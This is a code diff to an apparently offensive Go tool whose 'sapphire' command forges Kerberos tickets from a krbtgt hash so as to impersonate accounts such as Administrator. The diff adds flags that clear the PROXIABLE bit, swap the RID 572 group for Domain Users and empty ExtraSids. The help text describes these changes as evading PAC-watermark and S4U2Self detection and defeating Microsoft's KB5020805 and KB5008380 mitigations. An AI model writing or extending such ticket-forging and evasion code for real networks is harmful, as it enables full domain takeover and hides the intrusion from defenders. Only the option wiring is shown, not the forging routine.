@@ -463,7 +463,7 @@ func cmdSapphire(args []string) error {
 	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
 	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
 	var userID uint
-	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime bool
+	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime, stripProxiable, stripExtraGroups, clearExtraSids bool
 
 	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
 	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
@@ -472,12 +472,15 @@ func cmdSapphire(args []string) error {
 	fs.UintVar(&userID, "user-id", 0, "User ID for PAC_REQUESTOR (KB5008380)")
 	fs.StringVar(&outfile, "o", "", "Output file (.kirbi or .ccache)")
 	fs.StringVar(&outfile, "out", "", "Output file (.kirbi or .ccache)")
-	fs.BoolVar(&stripWatermark, "strip-watermark", false, "Rewrite S-1-18-2 → S-1-18-1 in PAC ExtraSids (evade PAC-watermark detection)")
+	fs.BoolVar(&stripWatermark, "strip-watermark", false, "Substitute S-1-18-2 → S-1-5-11 (Authenticated Users) in ExtraSids — eliminates authority-18 watermark while preserving PAC validity")
 	fs.BoolVar(&stripLogonFlags, "strip-logon-flags", false, "Clear LOGON_RESOURCE_GROUPS (0x200) bit in PAC UserFlags (second S4U2Self watermark)")
 	fs.BoolVar(&stripPACAttributes, "strip-pac-attributes", false, "Rewrite PAC_ATTRIBUTES_INFO flags 0x2 (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) → 0x1 (PAC_WAS_REQUESTED, AS-REQ)")
 	fs.BoolVar(&stripFullChecksum, "strip-full-checksum", false, "Remove PAC_FULL_CHECKSUM buffer (type 19, KB5020805 anti-sapphire measure)")
 	fs.BoolVar(&stripTicketChecksum, "strip-ticket-checksum", false, "Remove PAC_TICKET_CHECKSUM buffer (type 16, KB5008380 anti-transplant HMAC). WARNING: may fail on strict-enforcement DCs.")
 	fs.BoolVar(&syncClientInfoTime, "sync-client-info-time", false, "Rewrite CLIENT_INFO.ClientId FILETIME to match forged TGT AuthTime (matches legit TGT invariant)")
+	fs.BoolVar(&stripProxiable, "strip-proxiable", false, "Clear PROXIABLE bit in EncTicketPart.Flags (matches KDC behavior for protected/privileged accounts)")
+	fs.BoolVar(&stripExtraGroups, "strip-extra-groups", false, "Substitute RID 572 (Denied RODC Password Replication Group) → RID 513 (Domain Users) in LOGON_INFO — removes S4U2Self-transitive group IOC while preserving PAC validity")
+	fs.BoolVar(&clearExtraSids, "clear-extra-sids", false, "Set SidCount=0 and ExtraSids=NULL in LOGON_INFO (proper NDR-level removal — matches legit kinit baseline of empty ExtraSids)")
 	fs.Parse(args)
 
 	// Override global outfile if local one specified
@@ -564,6 +567,9 @@ func cmdSapphire(args []string) error {
 		StripFullChecksum:   stripFullChecksum,
 		StripTicketChecksum: stripTicketChecksum,
 		SyncClientInfoTime:  syncClientInfoTime,
+		StripProxiable:      stripProxiable,
+		StripExtraGroups:    stripExtraGroups,
+		ClearExtraSids:      clearExtraSids,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
